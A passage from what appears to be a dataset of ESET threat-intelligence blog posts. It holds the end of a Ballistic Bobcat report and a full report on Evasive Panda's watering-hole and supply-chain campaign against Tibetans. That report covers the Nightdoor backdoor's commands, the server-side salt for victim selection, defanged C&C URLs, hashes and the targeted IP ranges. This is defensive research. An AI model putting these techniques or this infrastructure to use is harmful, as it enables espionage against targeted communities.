%\nSYSTEMDRIVE%\\inetpub\\wwwroot\\aspnet_client\\ %USERPROFILE%\\AppData\\Local\\Temp\\file\\ %USERPROFILE%\\AppData\\Local\\Temp\\2\\low\\ %USERPROFILE%\\Desktop\\ %USERPROFILE%\\Downloads\\a\\ %WINDIR%\\ %WINDIR%\\INF\\MSExchange Delivery DSN\\ %WINDIR%\\Tasks\\ %WINDIR%\\Temp\\%WINDIR%\\Temp\\crashpad\\1\\Files Network | IP | Provider | First seen | Last seen | Details | | 162.55.137[.]20 | Hetzner Online GMBH | 2021-06-14 | 2021-06-15 | PowerLess C&C. | | 37.120.222[.]168 | M247 LTD | 2021-11-28 | 2021-12-12 | Sponsor C&C. | | 198.144.189[.]74 | Colocrossing | 2021-11-29 | 2021-11-29 | Support tools download site.\n| | 5.255.97[.]172 | The Infrastructure Group B.V. | 2021-09-05 | 2021-10-28 | Support tools download site.\n| MITRE ATT&CK techniques This table was built using version 13 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Reconnaissance | Active Scanning: Vulnerability Scanning | Ballistic Bobcat scans for vulnerable versions of Microsoft Exchange Servers to exploit.\n| | | Resource Development | Develop Capabilities: Malware | Ballistic Bobcat designed and coded the Sponsor backdoor.\n| | | Obtain Capabilities: Tool | Ballistic Bobcat uses various open-source tools as part of the Sponsoring Access campaign.\n| || | Initial Access | Exploit Public-Facing Application | Ballistic Bobcat targets internet-exposed Microsoft Exchange Servers.\n| | | Execution | Command and Scripting Interpreter: Windows Command Shell | The Sponsor backdoor uses the Windows command shell to execute commands on the victim’s system.\n| | | System Services: Service Execution | The Sponsor backdoor sets itself as a service and initiates its primary functions after the service is executed.\n| || | Persistence | Create or Modify System Process: Windows Service | Sponsor maintains persistence by creating a service with automatic startup that executes its primary functions in a loop.\n| | | Privilege Escalation | Valid Accounts: Local Accounts | Ballistic Bobcat operators attempt to steal credentials of valid users after initially exploiting a system before deploying the Sponsor backdoor.\n| | | Defense Evasion | Deobfuscate/Decode Files or Information | Sponsor stores information on disk that is encrypted and obfuscated, and deobfuscates it at runtime.\n| | | Obfuscated Files or Information | Configuration files that the Sponsor backdoor requires on disk are encrypted and obfuscated.\n| || | Valid Accounts: Local Accounts | Sponsor is executed with admin privileges, likely using credentials that operators found on disk; along with Ballistic Bobcat’s innocuous naming conventions, this allows Sponsor to blend into the background.\n| || | Credential Access | Credentials from Password Stores: Credentials from Web Browsers | Ballistic Bobcat operators use open-source tools to steal credentials from password stores inside web browsers.\n| | | Discovery | Remote System Discovery | Ballistic Bobcat uses the Host2IP tool, previously used by Agrius, to discover other systems within reachable networks and correlate their hostnames and IP addresses.\n| | | Command and Control | Data Obfuscation | The Sponsor backdoor obfuscates data before sending it to the C&C server.\n|","num_sentences":212,"metadata":{"source":"blog","platform":"welivesecurity","filename":"ballistic-bobcats"}}
{"id":207,"title":"Evasive Panda leverages Monlam Festival to target Tibetans","publish_date":"2024-03-07","link":"https://www.welivesecurity.com/en/eset-research/evasive-panda-leverages-monlam-festival-target-tibetans/","clean_text":"ESET researchers discovered a cyberespionage campaign that, since at least September 2023, has been victimizing Tibetans through a targeted watering hole (also known as a strategic web compromise), and a supply-chain compromise to deliver trojanized installers of Tibetan language translation software.\nThe attackers aimed to deploy malicious downloaders for Windows and macOS to compromise website visitors with MgBot and a backdoor that, to the best of our knowledge, has not been publicly documented yet; we have named it Nightdoor.\nKey points in this blogpost: - We discovered a cyberespionage campaign that leverages the Monlam Festival – a religious gathering – to target Tibetans in several countries and territories. -\nThe attackers compromised the website of the organizer of the annual festival, which takes place in India, and added malicious code to create a watering-hole attack targeting users connecting from specific networks. -\nWe also discovered that a software developer’s supply chain was compromised and trojanized installers for Windows and macOS were served to users. -\nThe attackers fielded a number of malicious downloaders and full-featured backdoors for the operation, including a publicly undocumented backdoor for Windows that we have named Nightdoor. -\nWe attribute this campaign with high confidence to the China-aligned Evasive Panda APT group.\nEvasive Panda profile Evasive Panda (also known as BRONZE HIGHLAND and Daggerfly) is a Chinese-speaking APT group, active since at least 2012.\nESET Research has observed the group conducting cyberespionage against individuals in mainland China, Hong Kong, Macao, and Nigeria.\nGovernment entities were targeted in Southeast and East Asia, specifically China, Macao, Myanmar, The Philippines, Taiwan, and Vietnam.\nOther organizations in China and Hong Kong were also targeted.\nAccording to public reports, the group has also targeted unknown entities in Hong Kong, India, and Malaysia.\nThe group uses its own custom malware framework with a modular architecture that allows its backdoor, known as MgBot, to receive modules to spy on its victims and enhance its capabilities.\nSince 2020 we have also observed that Evasive Panda has capabilities to deliver its backdoors via adversary-in-the-middle attacks hijacking updates of legitimate software.\nCampaign overview In January 2024, we discovered a cyberespionage operation in which attackers compromised at least three websites to carry out watering-hole attacks as well as a supply-chain compromise of a Tibetan software company.\nThe compromised website abused as a watering hole belongs to Kagyu International Monlam Trust, an organization based in India that promotes Tibetan Buddhism internationally.\nThe attackers placed a script in the website that verifies the IP address of the potential victim and if it is within one of the targeted ranges of addresses, shows a fake error page to entice the user to download a “fix” named certificate (with a .exe extension if the visitor is using Windows or .pkg if macOS).\nThis file is a malicious downloader that deploys the next stage in the compromise chain.\nBased on the IP address ranges the code checks for, we discovered that the attackers targeted users in India, Taiwan, Hong Kong, Australia, and the United States; the attack might have aimed to capitalize on international interest in the Kagyu Monlam Festival (Figure 1) that is held annually in January in the city of Bodhgaya, India.\nInterestingly, the network of the Georgia Institute of Technology (also known as Georgia Tech) in the United States is among the identified entities in the targeted IP address ranges.\nIn the past, the university was mentioned in connection with the Chinese Communist Party’s influence on education institutes in the US.\nAround September 2023, the attackers compromised the website of a software development company based in India that produces Tibetan language translation software.\nThe attackers placed several trojanized applications there that deploy a malicious downloader for Windows or macOS.\nIn addition to this, the attackers also abused the same website and a Tibetan news website called Tibetpost – tibetpost[.]net – to host the payloads obtained by the malicious downloads, including two full-featured backdoors for Windows and an unknown number of payloads for macOS.\nWith high confidence we attribute this campaign to the Evasive Panda APT group, based on the malware that was used: MgBot and Nightdoor.\nIn the past, we have seen both backdoors deployed together, in an unrelated attack against a religious organization in Taiwan, in which they also shared the same C&C server.\nBoth points also apply to the campaign described in this blogpost.\nWatering hole On January 14th, 2024, we detected a suspicious script at https://www.kagyumonlam[.]org/media/vendor/jquery/js/jquery.js?3.6.3.\nMalicious obfuscated code was appended to a legitimate jQuery JavaScript library script, as seen in Figure 2.\nThe script sends an HTTP request to the localhost address http://localhost:63403/?callback=handleCallback to check whether the attacker’s intermediate downloader is already running on the potential victim machine (see Figure 3).\nOn a previously compromised machine, the implant replies with handleCallback({\"success\":true }) (see Figure 4) and no further actions are taken by the script.\nIf the machine does not reply with the expected data, the malicious code continues by obtaining an MD5 hash from a secondary server at https://update.devicebug[.]com/getVersion.php.\nThen the hash is checked against a list of 74 hash values, as seen in Figure 6.\nIf there is a match, the script will render an HTML page with a fake crash notification (Figure 7) intended to bait the visiting user into downloading a solution to fix the problem.\nThe page mimics typical “Aw, Snap!”\nwarnings from Google Chrome.\nThe “Immediate Fix” button triggers a script that downloads a payload based on the user’s operating system (Figure 8).\nBreaking the hash The condition for payload delivery requires getting the correct hash from the server at update.devicebug[.]com, so the 74 hashes are the key to the attacker’s victim selection mechanism.\nHowever, since the hash is computed on the server side, it posed a challenge for us to know what data is used to compute it.\nWe experimented with different IP addresses and system configurations and narrowed down the input for the MD5 algorithm to a formula of the first three octets of the user’s IP address.\nIn other words, by inputting IP addresses sharing the same network prefix, for example 192.168.0.1 and 192.168.0.50, will receive the same MD5 hash from the C&C server.\nHowever, an unknown combination of characters, or a salt, is included with the string of first three IP octets before hashing to prevent the hashes from being trivially brute-forced.\nTherefore, we needed to brute-force the salt to secure the input formula and only then generate hashes using the entire range of IPv4 addresses to find the matching 74 hashes.\nSometimes the stars do align, and we figured out that the salt was 1qaz0okm!@#.\nWith all pieces of the MD5 input formula (for example, 192.168.1.1qaz0okm!@#), we brute-forced the 74 hashes with ease and generated a list of targets.\nSee the Appendix for a complete list.\nAs shown in Figure 9, the majority of targeted IP address ranges are in India, followed by Taiwan, Australia, the United States, and Hong Kong.\nNote that most of the Tibetan diaspora lives in India.\nWindows payload On Windows, victims of the attack are served with a malicious executable located at https://update.devicebug[.]com/fixTools/certificate.exe.\nFigure 10 shows the execution chain that follows when the user downloads and executes the malicious fix.\ncertificate.exe is a dropper that deploys a side-loading chain to load an intermediate downloader, memmgrset.dll (internally named http_dy.dll).\nThis DLL fetches a JSON file from the C&C server at https://update.devicebug[.]com/assets_files/config.json, which contains the information to download the next stage (see Figure 11).\nWhen the next stage is downloaded and executed, it deploys another side-loading chain to deliver Nightdoor as the final payload.\nAn analysis of Nightdoor is provided below in the Nightdoor section.\nmacOS payload The macOS malware is the same downloader that we document in more detail in Supply-chain compromise.\nHowever, this one drops an additional Mach-O executable, which listens on TCP port 63403.\nIts only purpose is to reply with handleCallback({\"success\":true }) to the malicious JavaScript code request, so if the user visits the watering-hole website again, the JavaScript code will not attempt to re-compromise the visitor.\nThis downloader obtains the JSON file from the server and downloads the next stage, just like the Windows version previously described.\nSupply-chain compromise On January 18th, we discovered that the official website (Figure 12) of a Tibetan language translation software product for multiple platforms was hosting ZIP packages containing trojanized installers for legitimate software that deployed malicious downloaders for Windows and macOS.\nWe found one victim from Japan who downloaded one of the packages for Windows.\nTable 1 lists the URLs and the dropped implants.\nTable 1.\nURLs of the malicious packages on the compromised website and payload type in the compromised application | Malicious package URL | Payload type | | https://www.monlamit[.]com/monlam-app-store/monlam-bodyig3.zip | Win32 downloader | | https://www.monlamit[.]com/monlam-app-store/Monlam_Grand_Tibetan_Dictionary_2018.zip | Win32 downloader | | https://www.monlamit[.]com/monlam-app-store/Deutsch-Tibetisches_W%C3%B6rterbuch_Installer_Windows.zip | Win32 downloader | | https://www.monlamit[.]com/monlam-app-store/monlam-bodyig-mac-os.zip | macOS downloader | | https://www.monlamit[.]com/monlam-app-store/Monlam-Grand-Tibetan-Dictionary-for-mac-OS-X.zip | macOS downloader | Windows packages Figure 13 illustrates the loading chain of the trojanized application from the package monlam-bodyig3.zip.\nThe trojanized application contains a malicious dropper called autorun.exe that deploys two components: - an executable file named MonlamUpdate.exe, which is a software component from an emulator called C64 Forever and is abused for DLL side-loading, and - RPHost.dll, the side-loaded DLL, which is a malicious downloader for the next stage.\nWhen the downloader DLL is loaded in memory, it creates a scheduled task named Demovale intended to be executed every time a user logs on.\nHowever, since the task does not specify a file to execute, it fails to establish persistence.\nNext, this DLL gets a UUID and the operating system version to create a custom User-Agent and sends a GET request to https://www.monlamit[.]com/sites/default/files/softwares/updateFiles/Monlam_Grand_Tibetan_Dictionary_2018/UpdateInfo.dat to obtain a JSON file containing the URL to download and execute a payload that it drops to the %TEMP% directory.\nWe were unable to obtain a sample of the JSON object data from the compromised website; therefore we don’t know from where exactly default_ico.exe is downloaded, as illustrated in Figure 13.\nVia ESET telemetry, we noticed that the illegitimate MonlamUpdate.exe process downloaded and executed on different occasions at least four malicious files to %TEMP%\\default_ico.exe.\nTable 2 lists those files and their purpose.\nTable 2.\nHash of the default_ico.exe downloader/dropper, contacted C&C URL, and description of the downloader | SHA-1 | Contacted URL | Purpose | | 1C7DF9B0023FB97000B7 | https://tibetpost[.]net/templates/ | Downloads an unknown payload from the server.\n| | F0F8F60429E3316C463F | Downloads an unknown payload from the server.\nThis sample was written in Rust.\n| | | 7A3FC280F79578414D71 | http://188.208.141[.]204:5040/ | Downloads a randomly named Nightdoor dropper.\n| | BFA2136336D845184436 | N/A | Open-source tool SystemInfo, into which the attackers integrated their malicious code and embedded an encrypted blob that, once decrypted and executed, installs MgBot.\n| Finally, the default_ico.exe downloader or dropper will either obtain the payload from the server or drop it, then execute it on the victim machine, installing either Nightdoor (see the Nightdoor section) or MgBot (see our previous analysis).\nThe two remaining trojanized packages are very similar, deploying the same malicious downloader DLL side-loaded by the legitimate executable.\nmacOS packages The ZIP archive downloaded from the official app store contains a modified installer package (.pkg file), where a Mach-O executable and a post-installation script were added.\nThe post-installation script copies the Mach-O file to $HOME/Library/Containers/CalendarFocusEXT/ and proceeds to install a Launch Agent in $HOME/Library/LaunchAgents/com.\nTerminal.us.plist for persistence.\nFigure 14 shows the script responsible for installing and launching the malicious Launch Agent.\nThe malicious Mach-O, Monlam-bodyig_Keyboard_2017 in Figure 13 is signed, but not notarized, using a developer certificate (not a certificate type usually used for distribution) with the name and team identifier ya ni yang (2289F6V4BN).\nThe timestamp in the signature shows that it was signed January 7th, 2024.\nThis date is also used in the modified timestamp of the malicious files in the metadata of the ZIP archive.\nThe certificate was issued only three days before.\nThe full certificate is available in the IoCs section.\nOur team reached out to Apple on January 25th and the certificate was revoked the same day.\nThis first-stage malware downloads a JSON file that contains the URL to the next stage.\nThe architecture (ARM or Intel), macOS version, and hardware UUID (an identifier unique to each Mac) are reported in the User-Agent HTTP request header.\nThe same URL as the Windows version is used to retrieve that configuration: https://www.monlamit[.]com/sites/default/files/softwares/updateFiles/Monlam_Grand_Tibetan_Dictionary_2018/UpdateInfo.dat.\nHowever, the macOS version will look at the data under the mac key of the JSON object instead of the win key.\nThe object under the mac key should contain the following: - url: The URL to the next stage. -\nmd5: MD5 sum of the payload. -\nvernow: A list of hardware UUIDs.\nIf present, the payload will only be installed on Macs that have one of the listed hardware UUIDs.\nThis check is skipped if the list is empty or missing. -\nversion: A numerical value that must be higher than the previously downloaded second stage “version”.\nThe payload is not downloaded otherwise.\nThe value of the currently running version is kept in the application user defaults.\nAfter the malware downloads the file from the specified URL using curl, the file is hashed using MD5 and compared to the hexadecimal digest under the md5 key.\nIf it matches, its extended attributes are removed (to clear the com.apple.quarantine attribute), the file is moved to $HOME/Library/SafariBrowser/Safari.app/Contents/MacOS/SafariBrower, and is launched using execvp with the argument run.\nUnlike the Windows version, we could not find any of the later stages of the macOS variant.\nOne JSON configuration contained an MD5 hash (3C5739C25A9B85E82E0969EE94062F40), but the URL field was empty.\nNightdoor The backdoor that we have named Nightdoor (and is named NetMM by the malware authors according to PDB paths) is a late addition to Evasive Panda’s toolset.\nOur earliest knowledge of Nightdoor goes back to 2020, when Evasive Panda deployed it onto a machine of a high-profile target in Vietnam.\nThe backdoor communicates with its C&C server via UDP or the Google Drive API.\nThe Nightdoor implant from this campaign used the latter.\nIt encrypts a Google API OAuth 2.0 token within the data section and uses the token to access the attacker’s Google Drive.\nWe have requested that the Google account associated with this token be taken down.\nFirst, Nightdoor creates a folder in Google Drive containing the victim’s MAC address, which also acts as a victim ID.\nThis folder will contain all the messages between the implant and the C&C server.\nEach message between Nightdoor and the C&C server is structured as a file and separated into filename and file data, as depicted in Figure 15.\nEach filename contains eight main attributes, which is demonstrated in the example below.\nExample: 1_2_0C64C2BAEF534C8E9058797BCD783DE5_168_0_1_4116_0_00-00-00-00-00-00 - 1_2: magic value. -\n0C64C2BAEF534C8E9058797BCD783DE5: header of pbuf data structure. -\n168: size of the message object or file size in bytes. -\n0: filename, which is always the default of 0 (null). -\n1: command type, hardcoded to 1 or 0 depending on the sample. -\n4116: command ID. -\n0: quality of service (QoS). -\n00-00-00-00-00-00: meant to be MAC address of the destination but always defaults to 00-00-00-00-00-00.\nThe data inside each file represents the controller’s command for the backdoor and the necessary parameters to execute it.\nFigure 16 shows an example of a C&C server message stored as file data.\nBy reverse engineering Nightdoor, we were able to understand the meaning of the important fields presented in the file, as shown in Figure 17.\nWe found that many meaningful changes were added to the Nightdoor version used in this campaign, one of them being the organization of command IDs.\nIn previous versions, each command ID was assigned to a handler function one by one, as shown in Figure 18.\nThe numbering choices, such as from 0x2001 to 0x2006, from 0x2201 to 0x2203, from 0x4001 to 0x4003, and from 0x7001 to 0x7005, suggested that commands were divided into groups with similar functionalities.\nHowever, in this version, Nightdoor uses a branch table to organize all the command IDs with their corresponding handlers.\nThe command IDs are continuous throughout and act as indexes to their corresponding handlers in the branch table, as shown in Figure 19.\nTable 3 is a preview of the C&C server commands and their functionalities.\nThis table contains the new command IDs as well as the equivalent IDs from older versions.\nTable 3.\nCommands supported by the Nightdoor variants used in this campaign.\n| Command ID | Previous command ID | Description | | | 0x1001 | 0x2001 | Collect basic system profile information such as: - OS version - IPv4 network adapters, MAC addresses, and IP addresses - CPU name - Computer name - Username - Device driver names - All usernames from C:\\Users\\* - Local time - Public IP address using the ifconfig.me or ipinfo.io webservice | | | 0x1007 | 0x2002 | Collect information about disk drives such as: - Drive name - Free space and total space - File system type: NTFS, FAT32, etc.\n| | | 0x1004 | 0x2003 | Collect information on all installed applications under Windows registry keys: - HKLM\\SOFTWARE\\ - WOW6432Node\\Microsoft\\Windows\\ - Microsoft\\Windows\\CurrentVersion\\Uninstall (x86) | | | 0x1003 | 0x2004 | Collect information on running processes, such as: - Process name - Number of threads - Username - File location on disk - Description of file on disk | | | 0x1006 | 0x4001 | Create a reverse shell and manage input and output via anonymous pipes.\n| | | 0x4002 | ||| | 0x4003 | ||| | 0x1002 | N/A | Self-uninstall.\n| | | 0x100C | 0x6001 | Move file.\nThe path is provided by the C&C server.\n| | | 0x100B | 0x6002 | Delete file.\nThe path is provided by the C&C server.\n| | | 0x1016 | 0x6101 | Get file attributes.\nThe path is provided by the C&C server.\n| Conclusion We have analyzed a campaign by the China-aligned APT Evasive Panda that targeted Tibetans in several countries and territories.\nWe believe that the attackers capitalized, at the time, on the upcoming Monlam festival in January and February of 2024 to compromise users when they visited the festival’s website-turned-watering-hole.\nIn addition, the attackers compromised the supply chain of a software developer of Tibetan language translation apps.\nThe attackers fielded several downloaders, droppers, and backdoors, including MgBot – which is used exclusively by Evasive Panda – and Nightdoor: the latest major addition to the group’s toolkit and which has been used to target several networks in East Asia.\nA comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.\nFor any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.\nESET Research offers private APT intelligence reports and data feeds.\nFor any inquiries about this service, visit the ESET Threat Intelligence page.\nIoCs Files | SHA-1 | Filename | Detection | Description | | 0A88C3B4709287F70CA2 | autorun.exe | Win32/Agent.\nAGFU | Dropper component added to the official installer package.\n| | 1C7DF9B0023FB97000B7 | default_ico.exe | Win32/Agent.\nAGFN | Intermediate downloader.\n| | F0F8F60429E3316C463F | default_ico.exe | Win64/Agent.\nDLY | Intermediate downloader programmed in Rust.\n| | 7A3FC280F79578414D71 | default_ico.exe | Win32/Agent.\nAGFQ | Nightdoor downloader.\n| | 70B743E60F952A1238A4 | UjGnsPwFaEtl.exe | Win32/Agent.\nAGFS | Nightdoor dropper.\n| | FA44028115912C95B5EF | RPHost.dll | Win32/Agent.\nAGFM | Intermediate loader.\n| | 5273B45C5EABE64EDBD0 | certificate.pkg | OSX/Agent.\nDJ | MacOS dropper component.\n| | 5E5274C7D931C1165AA5 | certificate.exe | Win32/Agent.\nAGES | Dropper component from the compromised website.\n| | 59AA9BE378371183ED41 | default_ico_1.exe | Win32/Agent.\nAGFO | Nightdoor dropper component.\n| | 8591A7EE00FB1BB7CC5B | memmgrset.dll | Win32/Agent.\nAGGH | Intermediate loader for Nightdoor downloader component.\n| | 82B99AD976429D0A6C54 | pidgin.dll | Win32/Agent.\nAGGI | Intermediate loader for Nightdoor.\n| | 3EEE78EDE82F6319D094 | Monlam_Grand_Tibetan_Dictionary_2018.zip | Win32/Agent.\nAGFM | Trojanized installer.\n| | 2A96338BACCE3BB687BD | jquery.js | JS/TrojanDownloader.\nAgent.\nAAPA | Malicious JavaScript added to the compromised website.\n| | 8A389AFE1F85F83E340C | Monlam Bodyig 3.1.exe | Win32/Agent.\nAGFU | Trojanized installer.\n| | 944B69B5E225C7712604 | deutsch-tibetisches_w__rterbuch_installer_windows.zip | MSIL/Agent.\nWSK | Trojanized installer package.\n| | A942099338C946FC196C | monlam-bodyig3.zip | Win32/Agent.\nAGFU | Trojanized installer package.\n| | 52FE3FD399ED15077106 | Monlam-Grand-Tibetan-Dictionary-for-mac-OS-X.zip | OSX/Agent.\nDJ | MacOS trojanized installer package.\n| | 57FD698CCB5CB4F90C01 | monlam-bodyig-mac-os.zip | OSX/Agent.\nDJ | MacOS trojanized installer package.\n| | C0575AF04850EB1911B0 | Security~.x64 | OSX/Agent.\nDJ | MacOS downloader.\n| | 7C3FD8EE5D660BBF43E4 | Security~.arm64 | OSX/Agent.\nDJ | MacOS downloader.\n| | FA78E89AB95A0B49BC06 | Security.fat | OSX/Agent.\nDJ | MacOS downloader component.\n| | 5748E11C87AEAB3C19D1 | Monlam_Grand_Dictionary export file | OSX/Agent.\nDJ | Malicious component from macOS trojanized installer package.\n| Certificates | Serial number | 49:43:74:D8:55:3C:A9:06:F5:76:74:E2:4A:13:E9:33 | | Thumbprint | 77DBCDFACE92513590B7C3A407BE2717C19094E0 | | Subject CN | Apple Development: ya ni yang (2289F6V4BN) | | Subject O | ya ni yang | | Subject L | N/A | | Subject S | N/A | | Subject C | US | | Valid from | 2024-01-04 05:26:45 | | Valid to | 2025-01-03 05:26:44 | | Serial number | 6014B56E4FFF35DC4C948452B77C9AA9 | | Thumbprint | D4938CB5C031EC7F04D73D4E75F5DB5C8A5C04CE | | Subject CN | KP MOBILE | | Subject O | KP MOBILE | | Subject L | N/A | | Subject S | N/A | | Subject C | KR | | Valid from | 2021-10-25 00:00:00 | | Valid to | 2022-10-25 23:59:59 | | IP | Domain | Hosting provider | First seen | Details | | N/A | tibetpost[.]net | N/A | 2023-11-29 | Compromised website.\n| | N/A | www.monlamit[.]com | N/A | 2024-01-24 | Compromised website.\n| | N/A | update.devicebug[.]com | N/A | 2024-01-14 | C&C. | | 188.208.141[.]204 | N/A | Amol Hingade | 2024-02-01 | Download server for Nightdoor dropper component.\n| MITRE ATT&CK techniques This table was built using version 14 of the MITRE ATT&CK framework.\n| Tactic | ID | Name | Description | | Resource Development | Acquire Infrastructure: Server | Evasive Panda acquired servers for the C&C infrastructure of Nightdoor, MgBot, and the macOS downloader component.\n| | | Acquire Infrastructure: Web Services | Evasive Panda used Google Drive’s web service for Nightdoor’s C&C infrastructure.\n| || | Compromise Infrastructure: Server | Evasive Panda operators compromised several servers to use as watering holes, for a supply-chain attack, and to host payloads and use as C&C servers.\n| || | Establish Accounts: Cloud Accounts | Evasive Panda created a Google Drive account and used it as C&C infrastructure.\n| || | Develop Capabilities: Malware | Evasive Panda deployed custom implants such as MgBot, Nightdoor, and a macOS downloader component.\n| || | T1588.003 | Obtain Capabilities: Code Signing Certificates | Evasive Panda obtained code-signing certificates.\n| | | Stage Capabilities: Drive-by Target | Evasive Panda operators modified a high-profile website to add a piece of JavaScript code that renders a fake notification to download malware.\n| || | Initial Access | Drive-by Compromise | Visitors to compromised websites may receive a fake error message enticing them to download malware.\n| | | Supply Chain Compromise: Compromise Software Supply Chain | Evasive Panda trojanized official installer packages from a software company.\n| || | Execution | Native API | Nightdoor, MgBot, and their intermediate downloader components use Windows APIs to create processes.\n| | | Scheduled Task/Job: Scheduled Task | Nightdoor and MgBot’s loader components can create scheduled tasks.\n| || | Persistence | Create or Modify System Process: Windows Service | Nightdoor and MgBot’s loader components can create Windows services.\n| | | Hijack Execution Flow: DLL Side-Loading | Nightdoor and MgBot’s dropper components deploy a legitimate executable file that side-loads a malicious loader.\n| || | Defense Evasion | Deobfuscate/Decode Files or Information | DLL components of the Nightdoor implant are decrypted in memory.\n| | | Impair Defenses: Disable or Modify System Firewall | Nightdoor adds two Windows Firewall rules to allow inbound and outbound communication for its HTTP proxy server functionality.\n| || | Indicator Removal: File Deletion | Nightdoor and MgBot can delete files.\n| || | Indicator Removal: Clear Persistence | Nightdoor and MgBot can uninstall themselves.\n| || | Masquerading: Masquerade Task or Service | Nightdoor’s loader disguised its task as netsvcs.\n| || | Masquerading: Match Legitimate Name or Location | Nightdoor’s installer deploys its components into legitimate system directories.\n| || | Obfuscated Files or Information: Embedded Payloads | Nightdoor’s dropper component contains embedded malicious files that are deployed on disk.\n| || | Process Injection: Dynamic-link Library Injection | Nightdoor and MgBot’s loaders components inject themselves into svchost.exe.\n| || | Reflective Code Loading | Nightdoor and MgBot’s loader components inject themselves into svchost.exe, from where they load the Nightdoor or MgBot backdoor.\n| || | Discovery | Account Discovery: Local Account | Nightdoor and MgBot collect user account information from the compromised system.\n| | | File and Directory Discovery | Nightdoor and MgBot can collect information from directories and files.\n| || | Process Discovery | Nightdoor and MgBot collect information about processes.\n| || | Query Registry | Nightdoor and MgBot query the Windows registry to find information about installed software.\n| || | Software Discovery | Nightdoor and MgBot collect information about installed software and services.\n| || | System Owner/User Discovery | Nightdoor and MgBot collect user account information from the compromised system.\n| || | System Information Discovery | Nightdoor and MgBot collect a wide range of information about the compromised system.\n| || | System Network Connections Discovery | Nightdoor and MgBot can collect data from all active TCP and UDP connections on the compromised machine.\n| || | Collection | Archive Collected Data | Nightdoor and MgBot store collected data in encrypted files.\n| | | Automated Collection | Nightdoor and MgBot automatically collect system and network information about the compromised machine.\n| || | Data from Local System | Nightdoor and MgBot collect information about the operating system and user data.\n| || | Data Staged: Local Data Staging | Nightdoor stages data for exfiltration in files on disk.\n| || | Command and Control | Application Layer Protocol: Web Protocols | Nightdoor communicates with the C&C server using HTTP.\n| | | Non-Application Layer Protocol | Nightdoor communicates with the C&C server using UDP.\nMgBot communicates with the C&C server using TCP.\n| || | Non-Standard Port | MgBot uses TCP port 21010.\n| || | Protocol Tunneling | Nightdoor can act as an HTTP proxy server, tunneling TCP communication.\n| || | Web Service | Nightdoor uses Google Drive for C&C communication.\n| || | Exfiltration | Automated Exfiltration | Nightdoor and MgBot automatically exfiltrate collected data.\n| | | Exfiltration Over Web Service: Exfiltration to Cloud Storage | Nightdoor can exfiltrate its files to Google Drive.\n| Appendix The targeted IP address ranges are provided in the following table.\n| CIDR | ISP | City | Country | | 124.171.71.0/24 | iiNet | Sydney | Australia | | 125.209.157.0/24 | iiNet | Sydney | Australia | | 1.145.30.0/24 | Telstra | Sydney | Australia | | 193.119.100.0/24 | TPG Telecom | Sydney | Australia | | 14.202.220.0/24 | TPG Telecom | Sydney | Australia | | 123.243.114.0/24 | TPG Telecom | Sydney | Australia | | 45.113.1.0/24 | HK 92server Technology | Hong Kong | Hong Kong | | 172.70.191.0/24 | Cloudflare | Ahmedabad | India | | 49.36.224.0/24 | Reliance Jio Infocomm | Airoli | India | | 106.196.24.0/24 | Bharti Airtel | Bengaluru | India | | 106.196.25.0/24 | Bharti Airtel | Bengaluru | India | | 14.98.12.0/24 | Tata Teleservices | Bengaluru | India | | 172.70.237.0/24 | Cloudflare | Chandīgarh | India | | 117.207.51.0/24 | Bharat Sanchar Nigam Limited | Dalhousie | India | | 103.214.118.0/24 | Airnet Boardband | Delhi | India | | 45.120.162.0/24 | Ani Boardband | Delhi | India | | 103.198.173.0/24 | Anonet | Delhi | India | | 103.248.94.0/24 | Anonet | Delhi | India | | 103.198.174.0/24 | Anonet | Delhi | India | | 43.247.41.0/24 | Anonet | Delhi | India | | 122.162.147.0/24 | Bharti Airtel | Delhi | India | | 103.212.145.0/24 | Excitel | Delhi | India | | 45.248.28.0/24 | Omkar Electronics | Delhi | India | | 49.36.185.0/24 | Reliance Jio Infocomm | Delhi | India | | 59.89.176.0/24 | Bharat Sanchar Nigam Limited | Dharamsala | India | | 117.207.57.0/24 | Bharat Sanchar Nigam Limited | Dharamsala | India | | 103.210.33.0/24 | Vayudoot | Dharamsala | India | | 182.64.251.0/24 | Bharti Airtel | Gāndarbal | India | | 117.255.45.0/24 | Bharat Sanchar Nigam Limited | Haliyal | India | | 117.239.1.0/24 | Bharat Sanchar Nigam Limited | Hamīrpur | India | | 59.89.161.0/24 | Bharat Sanchar Nigam Limited | Jaipur | India | | 27.60.20.0/24 | Bharti Airtel | Lucknow | India | | 223.189.252.0/24 | Bharti Airtel | Lucknow | India | | 223.188.237.0/24 | Bharti Airtel | Meerut | India | | 162.158.235.0/24 | Cloudflare | Mumbai | India | | 162.158.48.0/24 | Cloudflare | Mumbai | India | | 162.158.191.0/24 | Cloudflare | Mumbai | India | | 162.158.227.0/24 | Cloudflare | Mumbai | India | | 172.69.87.0/24 | Cloudflare | Mumbai | India | | 172.70.219.0/24 | Cloudflare | Mumbai | India | | 172.71.198.0/24 | Cloudflare | Mumbai | India | | 172.68.39.0/24 | Cloudflare | New Delhi | India | | 59.89.177.0/24 | Bharat Sanchar Nigam Limited | Pālampur | India | | 103.195.253.0/24 | Protoact Digital Network | Ranchi | India | | 169.149.224.0/24 | Reliance Jio Infocomm | Shimla | India | | 169.149.226.0/24 | Reliance Jio Infocomm | Shimla | India | | 169.149.227.0/24 | Reliance Jio Infocomm | Shimla | India | | 169.149.229.0/24 | Reliance Jio Infocomm | Shimla | India | | 169.149.231.0/24 | Reliance Jio Infocomm | Shimla | India | | 117.255.44.0/24 | Bharat Sanchar Nigam Limited | Sirsi | India | | 122.161.241.0/24 | Bharti Airtel | Srinagar | India | | 122.161.243.0/24 | Bharti Airtel | Srinagar | India | | 122.161.240.0/24 | Bharti Airtel | Srinagar | India | | 117.207.48.0/24 | Bharat Sanchar Nigam Limited | Yol | India | | 175.181.134.0/24 | New Century InfoComm | Hsinchu | Taiwan | | 36.238.185.0/24 | Chunghwa Telecom | Kaohsiung | Taiwan | | 36.237.104.0/24 | Chunghwa Telecom | Tainan | Taiwan | | 36.237.128.0/24 | Chunghwa Telecom | Tainan | Taiwan | | 36.237.189.0/24 | Chunghwa Telecom | Tainan | Taiwan | | 42.78.14.0/24 | Chunghwa Telecom | Tainan | Taiwan | | 61.216.48.0/24 | Chunghwa Telecom | Tainan | Taiwan | | 36.230.119.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 114.43.219.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 114.44.214.0/24 | Chunghwa Telecom | Taipei | Taiwan | | 114.45.2.0/24 | 